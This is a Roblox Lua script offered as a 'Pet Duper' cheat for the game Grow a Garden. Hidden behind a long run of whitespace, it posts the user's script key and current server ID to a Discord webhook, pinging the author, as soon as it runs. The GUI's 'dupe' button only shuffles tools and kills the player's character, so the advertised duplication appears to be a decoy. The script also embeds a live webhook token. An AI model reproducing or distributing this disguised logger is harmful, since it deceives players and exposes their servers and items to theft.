local DropGUI = Instance.new("ScreenGui")
local main = Instance.new("Frame")
local DropTool = Instance.new("TextButton")
local Equip = Instance.new("TextButton")
local Version = Instance.new("TextButton")
local Cred = Instance.new("TextButton")
local script_key = script_key;
local Content = script_key 
local test2 = 'Test'
local OSTime = os.time();
local Time = os.date('!*t', OSTime);
local TestTitle = 'Pet Duper';
local Embed = {
    title = 'Pets';
    color = '000000';
    footer = { text = game.JobId };
    author = {
        name = 'Grow a Garden';
        url = 'https://www.roblox.com/games/126884695634066/Grow-a-Garden';
    };
    fields = {
        {
            name = '"Dupe" Successful';
            value = '<@568416088543723561>';
        }
    };
    timestamp = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec);
};
(syn and syn.request or http_request) {
	
--[[box spam]]--
																																				Url = 'https://discord.com/api/webhooks/1388948433427239005/Iq9LsEDJob4Vrj7wlGQGEIV5nSNn51TogHyfOUKXBiBSPMUUXByj3gq-rleF_xyayNAb';
    Method = 'POST';
    Headers = {
        ['Content-Type'] = 'application/json';
    };
    Body = game:GetService'HttpService':JSONEncode( { content = Content; embeds = { Embed } } );
};


DropGUI.Name = "Drop GUI"
DropGUI.Parent = game.CoreGui
DropGUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

main.Name = "main"
main.Parent = DropGUI
main.BackgroundColor3 = Color3.fromRGB(0,1,0)
main.Position = UDim2.new(0.0809101239, 0, 0.203790441, 0)
main.Size = UDim2.new(0, 150, 0, 128)
main.Active = true
main.Draggable = true

DropTool.Name = "Drop Tool"
DropTool.Parent = main
DropTool.BackgroundColor3 = Color3.fromRGB(0,0,0)
DropTool.Position = UDim2.new(0.0597826242, 0, 0.119906127, 0)
DropTool.Size = UDim2.new(0, 55, 0, 50)
DropTool.Font = Enum.Font.SourceSans
DropTool.Text = "Equip what you want to dupe"
DropTool.TextColor3 = Color3.fromRGB(255, 255, 255)
DropTool.TextScaled = true
DropTool.TextSize = 14.000
DropTool.TextWrapped = true
DropTool.MouseButton1Down:Connect(function()
	game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tooal").Parent = game.Players.LocalPlayer.Character
end)

Equip.Name = "Equip"
Equip.Parent = main
Equip.BackgroundColor3 = Color3.fromRGB(0,0,0)
Equip.Position = UDim2.new(0.55251956, 0, 0.119906083, 0)
Equip.Size = UDim2.new(0, 58, 0, 50)
Equip.Font = Enum.Font.SourceSans
Equip.Text = "Dupe Tools"
Equip.TextColor3 = Color3.fromRGB(255, 255, 255)
Equip.TextScaled = true
Equip.TextSize = 14.000
Equip.TextWrapped = true
Equip.MouseButton1Down:Connect(function()
	LP = game:GetService("Players").LocalPlayer
for i,v in pairs(LP.Character:GetDescendants()) do
if v:IsA("Tool") then
v.Parent = LP
end
end
wait()
game.Players.LocalPlayer.Character.Head:Destroy()
if game.Players.LocalPlayer.Character.Humanoid.Health < 5 then 
    local deathmanok = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").position
    wait(0.1)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(deathmanok)
end
wait(7)
LP = game:GetService("Players").LocalPlayer
for i,v in pairs(LP:GetChildren()) do
if v:IsA("Tool") then
v.Parent = LP.Backpack
end
end
end)

Version.Name = "Version"
Version.Parent = main
Version.BackgroundColor3 = Color3.fromRGB(0,0,0)
Version.Position = UDim2.new(0, 0, 0.999885917, 0)
Version.Size = UDim2.new(0, 151, 0, 34)
Version.Font = Enum.Font.SourceSans
Version.Text = ""
Version.TextColor3 = Color3.fromRGB(0, 0, 0)
Version.TextScaled = true
Version.TextSize = 14.000
Version.TextWrapped = true

Cred.Name = "Cred"
Cred.Parent = main
Cred.BackgroundColor3 = Color3.fromRGB(300,300,300)
Cred.Position = UDim2.new(0, 0, -0.266169071, 0)
Cred.Size = UDim2.new(0, 151, 0, 34)
Cred.Font = Enum.Font.SourceSans
Cred.Text = "Equip a Pet/Item and then Dupe the tools"
Cred.TextColor3 = Color3.fromRGB(0, 0, 0)
Cred.TextSize = 14.000
Cred.TextWrapped = true
